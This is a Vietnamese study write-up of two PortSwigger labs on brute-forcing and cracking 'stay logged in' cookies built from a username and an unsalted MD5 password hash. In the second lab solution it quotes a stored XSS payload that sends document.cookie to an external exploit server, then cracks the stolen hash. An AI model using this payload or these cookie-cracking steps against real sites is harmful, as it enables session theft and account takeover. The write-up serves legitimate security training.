![image](https://github.com/user-attachments/assets/9cbad819-daa6-49d4-ab0a-0d158dcb0feb)I. Lý thuyết<br>
- ngoài chức năng login cơ bản, hầu hết web đều cung cấp chức năng bổ sung để user quản lý acc của họ
- VD: user can thay đổi hoặc đặt lại password khi quên
- -> các cơ chế này can tạo ra lỗ hổng mà attacker can khai thác
- web thg cẩn thận để tránh các lỗ hổng phổ biến trong trang login của họ, nhưng bn cần thực hiện các bc tương tự để đảm bảo rằng các chức năng liên quan cũng mạnh mẽ như nhau
- này là đặc bt quan trọng khi mà attacker can tạo acc của riêng họ và do đó can truy cập để nghiên cứu các trang bổ sung này<br>

II. Keeping users logged in<br>
1. Lý thuyết<br>
- 1 tính năng phổ biến là tùy chọn duy trì trạng thái login kể cả sau khi đóng phiên browser
- nó thường là hộp kiểm đc gắn nhãn như "Remember me" or "Keep me logged in"
- chức năng này đc triển khai bằng cách tạo 1 loại mã thông báo remember me đc lưu trữ trong 1 cookie liên tục
- có đc cookie này -> can bỏ qua toàn bộ quá trình login -> cách tốt nhất là ko thể đoán đc cookie này
- tuy nhiên nh web tạo cookie này dựa trên sự kết hợp can đoán của các giá trị tĩnh như username và dấu time, thậm chí còn xài password như 1 phần của cookie 
- cách tiếp cận này vô cùng nguy hiểm nếu attacker can tạo tài khoản của mình -> nghiên cứu cookie của mình -> đoán cách cookie được tạo
- sau khi đoán đc công thức, attacker brute-force cookie của các ng dùng khác và lấy quyền truy cập vào acc của họ
- một vài web cho rằng nếu cookie đc mã hóa thì sẽ ko thể đoán cho dù nó đc tạo từ giá trị tĩnh
- điều này can đúng nếu đc thực hiện chính xác và xài mã hóa phức tạp, ngay cả xài mã hóa như hàm băm 1 chiều cx ko hoàn toàn an toàn
- nếu attacker can dễ dàng đoán đc thuật toán băm và salt ko đc xài thì chúng can tấn công cookie bằng cách băm wordlist của họ
- phương pháp này can đc xài để vượt qua lim số lần login nếu chúng ko đc xài cho việc đoán cookie
- kể cả attacker ko thể tự tạo acc họ vẫn có thể khai thác lỗ hổng này
- bằng kĩ thuật thông thường như XSS, attacker can đánh cắp cookie của acc khác và suy ra cách cookie đc tạo
- nếu web đc xây dựng bằng framework nguồn mở thì chi tiết chính về c.trúc cookie can đc ghi lại công khai
- trong 1 số trh hiếm hoi can lấy đc password từ cookie
- các phiên bản băm của list password phổ biến có sẵn trực tuyến -> nếu pasword của user có ở 1 trong các list -> giải mã đơn giản
- -> salt rất quan trọng trong mã hóa hiệu quả<br>

2. Lab: Brute-forcing a stay-logged-in cookie<br>
This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page.<br>

Your credentials: wiener:peter<br>
Victim's username: carlos<br>
Candidate passwords: https://portswigger.net/web-security/authentication/auth-lab-passwords<br>

3. Giải<br>
- B1: login tài khoản đc cung cấp và duy trì trạng thái login của acc -> thu được phiên: d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw<br>

![image](https://github.com/user-attachments/assets/f31fd1dd-65c6-4a81-a459-a0183776f833)<br>

- B2: giải mã đoạn mã thu được: wiener:51dc30ddc473d43a6011e9ebba6ca770 -> chuỗi sau dấu ':' là được băm<br>

![image](https://github.com/user-attachments/assets/4af87c04-1fd5-4791-a923-062d9edc5aa9)<br>

- B3: logout acc đẻ thu request -> dùng cho tấn công<br>

![image](https://github.com/user-attachments/assets/4d44d526-cc2c-4783-99d9-db5ad583cf13)<br>

- B4: test thử tấn công với acc được cho<br>

![image](https://github.com/user-attachments/assets/774aec88-f917-4929-8144-21326a33433e)<br>

![image](https://github.com/user-attachments/assets/8c14efd3-0cb6-48ad-b241-58e91239e7a1)<br>

- B5: tấn công -> lấy phản hồi 302 -> show response in browser -> login<br>

![image](https://github.com/user-attachments/assets/a8fc50d6-e0ff-4309-9c2c-ac5246fea631)<br>

- B6: brute-force xài cú pháp của phiên và băm list password -> login đc sẽ có phản hồi: Update email -> dùng để lọc<br>

![image](https://github.com/user-attachments/assets/d8a4dd1e-f2a6-45e3-ac86-15529541ff59)<br>

![image](https://github.com/user-attachments/assets/225d9579-14ce-46fe-b453-507c8e4d6832)<br>

- B7: lấy phản hồi -> login<br>

![image](https://github.com/user-attachments/assets/66ba1fe7-aa6b-46d8-af11-2a40b17f7534)<br>

4. Lab: Offline password cracking<br>
This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.<br>

Your credentials: wiener:peter<br>
Victim's username: carlos<br>

5. Giải<br>
- B1: login vào acc đc cho và thu đc<br>

![image](https://github.com/user-attachments/assets/b9318590-e6b9-41b5-a38a-757dd7a5ade8)<br>

- B2: phân tích cấu trúc session: d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
- -> đoạn mã đc mã hóa base64 và băm md5<br>

![image](https://github.com/user-attachments/assets/25f8a61f-a0e2-4c44-9e1f-c11b29ca8d94)<br>

- B4: thử attack với acc đã cho -> xác định đc cấu trúc password (trong hình)<br>

![image](https://github.com/user-attachments/assets/b56c127c-2c29-4557-8315-3084d4386dc5)<br>

- B5: đến 1 blog và đăng 1 cmt có payload XSS: <script>document.location='//exploit-0a5d006c041ce5ea81c2f11801b7004a.exploit-server.net/'+document.cookie</script><br>

![image](https://github.com/user-attachments/assets/96495326-2dee-45b0-87cc-12d90a33b749)<br>

![image](https://github.com/user-attachments/assets/e24b4e2c-3cff-4bb4-a950-650fde453bc2)<br>

- B5: thu kết quả <br>

![image](https://github.com/user-attachments/assets/5411d07c-9857-4f89-bc70-823547313281)<br>

- Giải mã session: Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz<br>

![image](https://github.com/user-attachments/assets/227e06af-0a76-45d7-aa46-295865442b8e)<br>

![image](https://github.com/user-attachments/assets/3b10e2f0-746f-474f-a2f5-89590b60c9c1)<br>

- tool crack: https://crackstation.net/
